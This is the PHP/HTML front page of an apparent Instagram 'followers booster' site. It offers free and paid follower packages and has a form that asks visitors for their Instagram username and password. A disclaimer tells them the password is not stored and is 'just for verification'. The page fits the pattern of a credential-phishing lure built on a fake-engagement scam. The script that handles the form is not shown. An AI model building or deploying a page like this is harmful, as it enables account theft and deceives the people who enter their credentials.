<?php
session_start();

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: login.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Increase Instagram Followers</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Instagram Followers Booster</h1>
            <p>Get real followers fast!</p>
            <a href="logout.php" class="logout-btn">Logout</a>
        </header>
        
        <div class="main-content">
            <div class="stats-box">
                <div class="stat">
                    <h3>Current Followers</h3>
                    <p id="current-followers">1,250</p>
                </div>
                <div class="stat">
                    <h3>Target Followers</h3>
                    <input type="number" id="target-followers" placeholder="Enter target number" min="100" max="100000">
                </div>
            </div>
            
            <div class="package-box">
                <h2>Select a Package</h2>
                <div class="packages">
                    <div class="package free-package" data-followers="1000">
                        <h3>1000 Free Followers</h3>
                        <p>$0.00</p>
                        <button class="select-btn">Get Free</button>
                    </div>
                    <div class="package" data-followers="5000">
                        <h3>5000 Followers</h3>
                        <p>$39.99</p>
                        <button class="select-btn">Select</button>
                    </div>
                    <div class="package" data-followers="10000">
                        <h3>10000 Followers</h3>
                        <p>$69.99</p>
                        <button class="select-btn">Select</button>
                    </div>
                </div>
            </div>
            
            <div class="form-box">
                <h2>Enter Your Instagram Details</h2>
                <form id="instagram-form">
                    <div class="form-group">
                        <label for="username">Instagram Username</label>
                        <input type="text" id="username" placeholder="Without @" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Instagram Password</label>
                        <input type="password" id="password" placeholder="Your password" required>
                    </div>
                    <button type="submit" class="submit-btn">Start Increasing Followers</button>
                </form>
                <div class="disclaimer">
                    <p>Note: We don't store your Instagram password. This is just for verification.</p>
                </div>
            </div>
            
            <div class="progress-box hidden" id="progress-box">
                <h2>Progress</h2>
                <div class="progress-bar">
                    <div class="progress" id="progress"></div>
                </div>
                <p class="progress-text" id="progress-text">0% Complete</p>
                <p class="followers-added" id="followers-added">0 followers added</p>
            </div>
        </div>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
